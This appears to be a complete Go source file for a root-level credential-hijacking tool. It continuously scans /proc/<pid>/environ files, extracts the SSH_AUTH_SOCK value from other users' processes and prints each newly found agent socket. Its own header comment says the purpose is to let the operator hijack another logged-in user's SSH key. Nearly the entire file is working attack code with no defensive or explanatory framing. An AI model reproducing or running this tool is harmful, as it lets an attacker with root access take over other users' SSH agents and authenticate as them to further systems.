package main

// this package will consistently check /proc/#### directories
// for the environ file. When it finds a new one, it checks to
// see if the SSH_AUTH_SOCK variable is set, and if it is it will
// dump it to the screen. This will allow a user to hijack an SSH
// key as long as that user is still in the system.

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"regexp"
	"strconv"
	"strings"
)

// ENVIRON is the environ file within /proc/####/environ
const ENVIRON string = "environ"

// AUTHSOCK is the variable we are looking for in the environ
const AUTHSOCK string = "SSH_AUTH_SOCK"

// AgentObj will store an agent object.
type AgentObj struct {
	Agent string
}

// AgentStack holds a slice of agentObj's
type AgentStack struct {
	Stack []AgentObj
}

// NewAgentStack creates a new agentstack properly.
func NewAgentStack() AgentStack {
	a := AgentStack{}
	return a
}

// NewAgentObj creates a new AgentObj properly
func NewAgentObj(providedAgent string) AgentObj {
	a := AgentObj{}
	a.Agent = providedAgent
	return a
}

// Push will push a new agent on the pre-defined agent stack. Will
// return true if this is a new agent and it was successfully pushed
// onto the stack, false if we have this already.
func (a *AgentStack) Push(agent string) bool {
	// first, does this already exist?
	if a.agentExists(agent) {
		return false
	}

	// also if this is just a string(0) then we'll just
	// return a false because I don't know how better to
	// handle this and frankly I don't care. My brain is fried.
	if agent == "0" {
		return false
	}
	// otherwise, it doesn't exist so push it onto the stack.
	a.Stack = append(a.Stack, NewAgentObj(agent))
	return true
}

func (a *AgentStack) agentExists(agent string) bool {
	// will return true or false if the suspected
	// agent exists in the list.
	var exists = false
	for i := 0; i < len(a.Stack); i++ {
		if a.Stack[i].Agent == agent {
			exists = true
			break
		}
	}
	return exists
}

func main() {
	// first and foremost, let's confirm that we're root.
	if !areWeRoot() {
		fmt.Println("You must be root to run this application. Quitting...")
		return
	}
	loopThrough("/proc")
}

func loopThrough(loc string) {
	// This function will do most of the setup.
	a := NewAgentStack()
	for {
		validPids, err := findEnviron(loc)
		if err != nil {
			log.Println("Error:", err)
		}
		pidQueue := make(chan string, len(validPids))
		res := make(chan string) // going unbuffererd because I'm crazy like that

		for _, pid := range validPids {
			pidQueue <- pid
		}
		go parseProc(pidQueue, res)
		go parseProc(pidQueue, res)

		for i := 0; i < len(validPids); i++ {
			select {
			case foundAgent := <-res:
				if a.Push(foundAgent) {
					fmt.Println("Found Agent:", foundAgent)
				}
			}
		}
	}
}

func parseProc(jobQueue <-chan string, resQueue chan<- string) {
	for pid := range jobQueue {
		environ, err := dumpEnviron(pid)
		if err != nil {
			// there has to be a better way of handling this
			resQueue <- "0"
			continue
		}
		resQueue <- environ
	}
}

func dumpEnviron(loc string) (string, error) {
	// assuming that the environ variable has the SSH_AUTH_SOCK
	// there, this will dump the actual socket as a string. This
	// may be a little bit of a duplication of effort but I wanted
	// to keep it as simple and modular as possible.
	var ret string
	e, err := ioutil.ReadFile(loc)
	if err != nil {
		// log.Println("Error reading the environment file!")
		// sometimes we just don't care if we can't read it. No sense
		// logging it.
		return ret, err
	}
	nullByte := []byte{0}
	envVars := bytes.SplitN(e, nullByte, -1)
	for _, env := range envVars {
		line := string(env)
		res := strings.Split(line, "=")
		if res[0] == AUTHSOCK {
			return res[1], err
		}
	}
	err = fmt.Errorf("could not find SSH agent socket")
	return ret, err
}

func isEnviron(loc string) bool {
	// this will read the environment file and
	// return True if the SSH_AUTH_SOCK variable exists

	e, err := ioutil.ReadFile(loc)
	if err != nil {
		log.Println("could not read environment file")
		return false
	}
	// split by null byte. This is weird to create because
	// go just straight up doesn't like defining a byte slice
	// of just one single null byte. The implicit variable
	// declaration is the only way I've found to do it and it's
	// necessary since the environ file is separated by null bytes
	// ¯\_(ツ)_/¯
	nullByte := []byte{0}
	envVars := bytes.SplitN(e, nullByte, -1)
	for _, env := range envVars {
		line := string(env)
		// now split by =
		res := strings.Split(line, "=")
		if res[0] == AUTHSOCK {
			return true
		}
	}
	return false
}

func areWeRoot() bool {
	user, err := user.Current()
	if err != nil {
		log.Fatalln("Could not get current user!")
	}
	thisUID, err := strconv.Atoi(user.Uid)
	if err != nil {
		return false //wha?
	}
	if thisUID == 0 {
		// we are root
		return true
	}
	return false
}

func findEnviron(startPath string) ([]string, error) {
	if !strings.HasSuffix(startPath, "/") {
		startPath += "/"
	}
	var pidSlice []string
	var validEnviron []string
	files, err := ioutil.ReadDir(startPath)
	if err != nil {
		// file read error
		return validEnviron, err
	}
	// if this isn't catching anything, drop the /
	rex, err := regexp.Compile(startPath + `\d+`)
	if err != nil {
		// regex error for some reason
		return validEnviron, err
	}
	for _, file := range files {
		fullPath := startPath + file.Name()
		if rex.MatchString(fullPath) {
			pidSlice = append(pidSlice, fullPath)
		}
	}

	for _, pid := range pidSlice {
		// sometimes go is just weird man
		if _, err := os.Stat(pid + "/" + ENVIRON); !os.IsNotExist(err) {
			validEnviron = append(validEnviron, pid+"/"+ENVIRON)
		}
	}
	return validEnviron, err
}

// func old_and_busted_findEnviron(startPath string) ([]string, error) {
// 	// This function will return a slice of strings pointing
// 	// to the location of an environ file. This will be split
// 	// to a workqueue later.
// 	if !strings.HasSuffix(startPath, "/") {
// 		startPath += "/"
// 	}
// 	// just making sure we end with a /
// 	rex, err := regexp.Compile(startPath + `\d+/environ`)

// 	// create the slice to append to
// 	var enviroSlice []string

// 	if err := filepath.Walk(startPath, func(path string, info os.FileInfo, err error) error {
// 		fmt.Println("On:", path)
// 		if err != nil {
// 			return err
// 		}
// 		if info.IsDir() {
// 			return nil
// 		}
// 		if rex.MatchString(path) {
// 			enviroSlice = append(enviroSlice, path)
// 		}
// 		return nil
// 	}); err != nil {
// 		log.Println("Could not read path!")
// 		log.Println(err)
// 		return enviroSlice, err
// 	}
// 	return enviroSlice, err
// }
